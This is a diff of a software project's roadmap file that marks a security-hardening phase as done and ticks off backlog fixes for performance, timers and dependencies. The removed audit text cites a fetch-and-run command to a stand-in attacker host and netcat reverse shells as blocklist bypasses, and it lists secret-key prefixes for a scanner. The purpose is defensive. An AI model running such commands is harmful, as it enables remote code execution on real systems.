@@ -53,7 +53,7 @@
 | 109 | Editor Improvements | P3 — power user UX | 🔄 In Progress |
 | 117 | Excalidraw Diagramming — MCP Tools & Marketplace Skill | P3 — capability + visualization | Planned |
 | 120 | Canvas Editor Improvements | P3 — canvas improvements | Planned |
-| 121 | Security Hardening & Code Audit | P1 — security + stability | Planned |
+| ~~121~~ | ~~Security Hardening & Code Audit~~ | ~~P1~~ | ✅ Done — ADR 195 |
 | — | Engineering Backlog | Ongoing | Pick-up opportunistically |
 | License Up | Tier Audit & Enforcement Activation | P1 — commercial | Planned (pre-release) |
 | Future | LLM Providers, LLM Lifecycle, Responsible AI, Voice, Infrastructure | Future / Demand-Gated | — |
@@ -124,37 +124,6 @@ Two sub-phases: MCP tools → marketplace skill & workflow integration.
 
 ---
 
-## Phase 121: Security Hardening & Code Audit
-
-**Priority**: P1 — Security + stability. Findings from comprehensive codebase audit (2026-03-03). Addresses security vulnerabilities, execution sandbox gaps, and hardening measures.
-
-### 121-A: Secrets & Credential Hygiene
-
-- [ ] **Rotate exposed credentials** — `.env.dev` contains live Google OAuth client secret (`GOCSPX-...`), GitHub OAuth client secret, and commented-but-present Anthropic API keys. `.env.old.backup` has the same. Rotate ALL keys immediately (Google OAuth, GitHub OAuth, Anthropic). Replace `.env.dev` values with placeholders.
-- [ ] **Pre-commit secret scanner** — Add a git pre-commit hook (e.g., `gitleaks` or `detect-secrets`) that scans staged files for API key patterns (`sk-ant-`, `GOCSPX-`, `ghp_`, `Bearer`). Prevent accidental commits of secrets.
-- [ ] **Remove `.env.old.backup`** — Stale backup file with real credentials. Delete from filesystem.
-- [ ] **Clean `example.ts`** — File in `src/example.ts` sets `process.env.SECUREYEOMAN_SIGNING_KEY = 'test-signing-key-at-least-32-chars-long'` at module level. Move to `examples/` directory outside `src/`, remove hardcoded secret values.
-
-### 121-B: Execution Sandbox Hardening
-
-- [ ] **Terminal route allowlist** — `terminal-routes.ts` uses a blocklist for dangerous commands, which is bypassable (`curl attacker.com | bash`, `python -c "..."`, `nc` for reverse shells). Switch to an allowlist approach: only permit executables detected from the project's tech stack. Remove the `override: true` body flag or require admin role + 2FA.
-- [ ] **Terminal `execFile()` migration** — Replace `exec(command)` with `execFile(executable, args)` to prevent shell metacharacter interpretation. Apply `SHELL_INJECTION_PATTERN` unconditionally (currently only checked when sensitive paths are present).
-- [ ] **Workflow condition safe evaluator** — `workflow-engine.ts:1047` uses `new Function('steps', 'input', expr)` for condition expressions. Any operator-level user can inject arbitrary JS via workflow definitions. Replace with a safe AST-based expression evaluator that only permits property access, comparisons, and boolean logic (no function calls, no `require`/`import`). Libraries: `jsep` + custom evaluator, or `expr-eval`.
-- [ ] **Sandbox function serialization** — `linux-sandbox.ts:138` and `landlock-worker.ts:138` serialize functions via `fn.toString()` and reconstruct with `new Function()`. Pass structured data instead of serialized function bodies. Log + alert when Landlock is unavailable and the system falls back to the noop soft sandbox.
-
-### 121-C: HTTP Security Hardening
-
-- [ ] **CSP nonce-based scripts** — `server.ts:296` uses `script-src 'self' 'unsafe-inline'` which defeats XSS protection. Implement nonce-based CSP: generate random nonce per request, inject into `<script>` tags, use `script-src 'self' 'nonce-<random>'`. Keep `'unsafe-inline'` only for `style-src`.
-- [ ] **Global rate limiting** — Apply a per-IP rate limit as a Fastify `onRequest` hook. Add dedicated stricter limits for `terminal/execute` and `execution/run` endpoints (currently unprotected). The existing `api_requests` rule (100/min) is not enforced at the Fastify hook level.
-- [ ] **WebSocket token hardening** — `/ws/metrics` authenticates via `?token=<jwt>` in query string (logged by proxies, visible in browser history). Use short-lived single-use tokens specifically for WS upgrade, not the main JWT. Document proxy log scrubbing for operators.
-
-### 121-D: Data & Auth Boundary Fixes
-
-- [ ] **`bypassRls()` audit logging** — `pg-base.ts:76` sets `SET LOCAL row_security = off` for admin ops with no audit trail. Add an assertion verifying admin role + audit log entry with reason parameter inside `bypassRls()`.
-- [ ] **Error message sanitization** — Several route handlers pass `err.message` to `sendError()` for 500 errors (e.g., `gateway-routes.ts:113,151`), potentially leaking internal details. Ensure all 5xx errors use generic messages; log details server-side only.
-- [ ] **Pagination upper bounds** — Multiple routes accept `?limit=999999999` with no cap (e.g., `analytics-routes.ts` uses `Number(limit) || 50`). Add `Math.min(parsed, MAX_LIMIT)` to all routes. Only `notification-routes.ts` currently caps at 100.
-- [ ] **License key persistence** — `license-routes.ts:43` mutates `process.env.SECUREYEOMAN_LICENSE_KEY = key` at runtime. Not persisted across restarts. Store in database or config file instead.
-
 ---
 
 ## Engineering Backlog
@@ -188,53 +157,53 @@ Current: 87.01% stmt / 76.02% branches. Target: 88% / 77%. Gap: <1% each.
 
 ### Database Performance
 
-- [ ] **Add LIMIT to unbounded SELECTs** — 10+ storage files return unbounded result sets: `finetune-manager.ts:143`, `distillation-manager.ts:163`, `oauth-token-storage.ts:124`, `conversation-storage.ts:619`, `federation-storage.ts:96`, `autonomy-audit.ts:263`, `rbac-storage.ts:161`, `alert-storage.ts:147`, `extensions/storage.ts:102,185`, `brain/storage.ts:713`. Add `LIMIT` with reasonable defaults (e.g., 1000) or pagination.
-- [ ] **N+1 query in marketplace sync** — `marketplace/manager.ts:445-448` calls `listDefinitions({ limit: 1000 })` inside the loop for every workflow file during `syncFromCommunityRepo()`. Fetch the full list once before the loop, build a lookup Map. Use batch `INSERT...ON CONFLICT DO UPDATE` for skill sync.
-- [ ] **N+1 in code execution init** — `execution/manager.ts:52-62` fetches all sessions then updates each stale one individually. Replace with a single `UPDATE...WHERE status = 'active' AND last_activity < $1`.
-- [ ] **PG pool `statement_timeout`** — `pg-pool.ts:51-66` has no statement timeout. A runaway query can hold a connection indefinitely, exhausting the pool. Add `statement_timeout` (e.g., 30s) via pool config or `SET statement_timeout` in connect handler. Also consider `allowExitOnIdle: true`.
-- [ ] **MCP health checks parallelization** — `mcp/health-monitor.ts:55-59` checks servers sequentially (N × 10s worst case). Use `Promise.allSettled()` for parallel checks.
+- [x] **Add LIMIT to unbounded SELECTs** — Added LIMIT to 11 unbounded queries across finetune-manager, distillation-manager, oauth-token-storage, conversation-storage, federation-storage, autonomy-audit, rbac-storage, alert-storage, extensions/storage (2), brain/storage.
+- [x] **N+1 query in marketplace sync** — Hoisted `listDefinitions()` before the loop, built a lookup Map. Also fixed directory-based sync N+1.
+- [x] **N+1 in code execution init** — Added `expireStaleSessions(timeoutMs)` batch method to storage. Replaced loop with single UPDATE.
+- [x] **PG pool `statement_timeout`** — Added `statement_timeout: 30_000` and `allowExitOnIdle: true` to pool config.
+- [x] **MCP health checks parallelization** — Replaced sequential `for...of` with `Promise.allSettled()`.
 
 ### Memory & Timer Cleanup
 
-- [ ] **Timer cleanup in `SecureYeoman.cleanup()`** — Missing `stop()`/`close()` calls for: `notificationManager` (has active `_cleanupTimer`), `abuseDetector` (has `evictTimer`), `skillScheduler` (has `checkInterval`), `mcpHealthMonitor`, `a2aManager` (has `heartbeatTimer`), `consolidationManager` (has `schedulerTimer`). While most use `.unref()`, they may fire during shutdown and access null refs.
-- [ ] **Missing `.unref()` on timers** — `secureyeoman.ts:694` (`usagePruneTimer`), `:1537` (`riskScheduleTimer`), and `execution/manager.ts:65` (`expiryTimer`) keep the process alive after graceful shutdown. Add `.unref()` consistent with other timers.
-- [ ] **`UsageAnomalyDetector` periodic eviction** — `analytics/usage-anomaly-detector.ts` evicts stale entries only when `recordMessage()` is called. If the system goes idle, entries accumulate. Add a `setInterval` for periodic eviction like `AbuseDetector`, plus a `stop()` method called from cleanup.
-- [ ] **`ConsolidationManager.flaggedIds` unbounded** — `brain/consolidation/manager.ts:61` Set has no cap. Add max size (e.g., 10,000) with oldest-first eviction.
-- [ ] **`ConversationManager.conversations` cap** — `integrations/conversation.ts:32` Map grows with unique thread keys. Add LRU eviction at a hard cap (e.g., 10,000 entries).
+- [x] **Timer cleanup in `SecureYeoman.cleanup()`** — Added `notificationManager.stopCleanupJob()` call. (abuseDetector, skillScheduler, mcpHealthMonitor, consolidationManager are not SecureYeoman fields — they're local or passed as options.)
+- [x] **Missing `.unref()` on timers** — Added `.unref()` to `usagePruneTimer`, `riskScheduleTimer`, and `expiryTimer`.
+- [x] **`UsageAnomalyDetector` periodic eviction** — Added 60s `setInterval` eviction timer with `.unref()` and `stop()` method.
+- [x] **`ConsolidationManager.flaggedIds` unbounded** — Added `MAX_FLAGGED_IDS = 10_000` cap with oldest-first eviction via `addFlaggedId()` helper.
+- [x] **`ConversationManager.conversations` cap** — Added `MAX_CONVERSATIONS = 10_000` cap with oldest-first eviction in `addMessage()`.
 - [ ] **Storage object cleanup** — ~20 storage objects initialized but never closed in `cleanup()`: `heartbeatLogStorage`, `alertStorage`, `notificationStorage`, `scanHistoryStore`, `riskAssessmentStorage`, `departmentRiskStorage`, `athiStorage`, `providerAccountStorage`, `analyticsStorage`, `autonomyAuditStorage`, `groupChatStorage`, `routingRulesStorage`, `backupStorage`, `tenantStorage`, `strategyStorage`, `pipelineLineageStorage`. Consider a registry pattern for systematic cleanup.
 
 ### Async & Startup Performance
 
 - [ ] **Parallel `ensureTables()` during init** — `secureyeoman.ts:388-1845` runs many independent storage init calls sequentially. After migrations complete, group independent `ensureTables()` and `init()` calls into `Promise.all()` batches.
-- [ ] **Marketplace sync `readFileSync` → async** — `marketplace/manager.ts:337,429,489,586,641,718` uses `readFileSync` in a loop for every skill/workflow/personality/theme file. Switch to `fs.promises.readFile` — the loop already `await`s storage ops.
-- [ ] **`AbuseDetector.evictStale()` hot path** — Called on every `check()`, iterating the entire sessions Map (O(n)). The existing 60-second interval timer already handles eviction — remove the per-check call.
+- [x] **Marketplace sync `readFileSync` → async** — Converted all `readFileSync` calls to `await fs.promises.readFile` in marketplace/manager.ts.
+- [x] **`AbuseDetector.evictStale()` hot path** — Removed per-check `evictStale()` call; existing 60s interval timer handles eviction.
 - [ ] **Response cache key optimization** — `ai/response-cache.ts:65` computes `JSON.stringify` + SHA-256 on the full messages array for every cache lookup (hot path). Consider a faster hash (xxhash/FNV) or incremental key building.
 
 ### Code Quality & Consistency
 
 - [ ] **Unify error response format** — Two competing patterns: `sendError()` returns `{ error, message, statusCode }` (~60% of routes) vs. inline `reply.code(N).send({ error: '...' })` with single key (~40%). Migrate all to `sendError()`. Affected: `analytics-routes.ts` (12 instances), `multimodal-routes.ts`, `diagnostic-routes.ts`, `chat-routes.ts`, `desktop-routes.ts`, `extension-routes.ts`.
-- [ ] **Adopt `toErrorMessage()` utility** — `err instanceof Error ? err.message : '...'` appears 110+ times across 24 route files. The `toErrorMessage()` utility exists in `utils/errors.ts`. Replace all inline checks. Also 16 occurrences in `secureyeoman.ts` alone.
+- [x] **Adopt `toErrorMessage()` utility** — Replaced ~110 instances across 28 route files with `toErrorMessage()` from `utils/errors.ts`.
 - [ ] **Extract `initOptional()` helper** — `secureyeoman.ts` has 14+ identical try/catch/warn blocks for non-fatal manager init. Extract to `private initOptional<T>(name: string, init: () => T): T | null`. Saves ~120 lines.
-- [ ] **Standardize `reply.code()` vs `reply.status()`** — Mixed usage across routes (`training-routes.ts` uses `.status()`, others use `.code()`). Standardize on `.code()` (Fastify's primary API).
+- [x] **Standardize `reply.code()` vs `reply.status()`** — Replaced 28 instances in `training-routes.ts` (21) and `cicd-webhook-routes.ts` (7).
 - [ ] **Standardize pagination parsing** — Different routes use `Number()` vs `parseInt()` vs `Math.min()` with inconsistent max caps. Create a shared `parsePagination(query)` utility with consistent parsing and upper bounds.
 - [ ] **Consistent response wrapping** — Some endpoints return raw arrays, others wrap in `{ data }` or named keys. Establish and document a convention.
-- [ ] **Workflow condition failure logging** — `workflow-engine.ts:1091` catches condition evaluation errors and silently returns `false`. Add `warn`-level log with expression and error context.
-- [ ] **Silent catch blocks in `getMetrics()`** — `secureyeoman.ts:2016,2034` silently return `{}` when subsystems fail. Add `debug`-level logging inside catch blocks.
+- [x] **Workflow condition failure logging** — Added `warn`-level log with expression and error context to `evaluateCondition()` catch block.
+- [x] **Silent catch blocks in `getMetrics()`** — Added `debug`-level logging to both silent catch blocks.
 
 ### Dependency Cleanup
 
-- [ ] **Move `@vitest/coverage-v8` to devDependencies** — Listed in `packages/core/package.json` production `dependencies`. Inflates Docker images unnecessarily.
-- [ ] **Remove `discord.js` from dashboard** — `packages/dashboard/package.json` lists `discord.js: "13.17.1"` (Node.js-only library) as a frontend dependency. Not imported anywhere in dashboard source.
-- [ ] **Move `eslint` + `typescript-eslint` to devDependencies** — Listed under `dependencies` in `packages/dashboard/package.json`. Development-only tools.
-- [ ] **Remove `@types/express`** — Listed in `packages/core/package.json` devDependencies. Project uses Fastify. Only one file (`capture-permissions.ts`) imports Express types as dead code (unused `Response`, `NextFunction` at line 287).
-- [ ] **Evaluate `@hapi/boom` removal** — Only imported in `whatsapp/adapter.ts` for `Boom` type check. Consider replacing with `instanceof Error` to eliminate the dependency.
+- [x] **Move `@vitest/coverage-v8` to devDependencies** — Moved from production `dependencies` to `devDependencies`.
+- [x] **Remove `discord.js` from dashboard** — Removed from `packages/dashboard/package.json`.
+- [x] **Move `eslint` + `typescript-eslint` to devDependencies** — Moved from `dependencies` to `devDependencies` in dashboard.
+- [x] **Remove `@types/express`** — Removed from core devDependencies. Replaced Express types in `capture-permissions.ts` with inline types.
+- [x] **Evaluate `@hapi/boom` removal** — Removed `@hapi/boom` from core dependencies. Replaced `Boom` type cast in `whatsapp/adapter.ts` with inline structural type.
 
 ### Type Safety
 
 - [ ] **Dashboard API client types** — `packages/dashboard/src/api/client.ts` has 36 `: any` annotations, especially around risk departments, ATHI scenarios, versioning, citations. Import proper types from `@secureyeoman/shared`.
 - [ ] **Fastify typed route params** — 18 occurrences of unsafe `request.params as { ... }` casts across route files. Use Fastify's generic route parameters: `FastifyRequest<{ Params: { id: string } }>`.
-- [ ] **Remove dead Express import** — `body/capture-permissions.ts:287` imports `type { Response, NextFunction } from 'express'` — unused.
-- [ ] **Delete `debug2.test.ts`** — `brain/debug2.test.ts` is a debugging artifact with `console.log` and no real assertions. Delete or convert to a proper integration test.
+- [x] **Remove dead Express import** — Removed unused `type { Response, NextFunction } from 'express'` from `capture-permissions.ts`.
+- [x] **Delete `debug2.test.ts`** — Deleted debugging artifact `brain/debug2.test.ts`.
 
 ### Configuration Centralization
 
@@ -404,4 +373,4 @@ See [dependency-watch.md](dependency-watch.md) for tracked third-party dependenc
 
 ---
 
-*Last updated: 2026-03-03 — Added Phase 121 (Security Hardening & Code Audit) and expanded Engineering Backlog from comprehensive codebase audit. See [Changelog](../../CHANGELOG.md) for full history.*
+*Last updated: 2026-03-03 — Completed Phase 121 (Security Hardening & Code Audit, ADR 195). See [Changelog](../../CHANGELOG.md) for full history.*
